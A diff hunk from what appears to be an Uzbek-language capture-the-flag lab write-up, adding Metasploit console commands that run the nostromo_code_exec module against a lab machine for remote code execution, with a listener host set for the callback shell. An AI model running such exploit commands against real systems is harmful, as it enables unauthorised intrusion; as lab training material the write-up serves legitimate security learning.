@@ -9,3 +9,8 @@ Port 80 ochiq bo‘lgani uchun brauzer orqali 10.129.1.193 IP-manzilini tekshiri
 
 Zaiflikdan foydalanish uchun Metasploit Framework dan foydalanamiz. Biz `Nostromo <= 1.9.6` versiyasidagi masofadan kod bajarish (RCE) zaifligini ekspluatatsiya qiluvchi modulni topdik. Ushbu muammo nostromo nhttpd ning `http_verify` funksiyasidagi directory traversal tufayli yuzaga keladi, bu esa tajovuzkorga maxsus yaratilgan HTTP so‘rovi orqali masofadan kod bajarishga imkon beradi.  
 
+```
+use exploit/multi/http/nostromo_code_exec
+set rhosts 10.129.1.193
+set lhost 10.10.14.52
+exploit
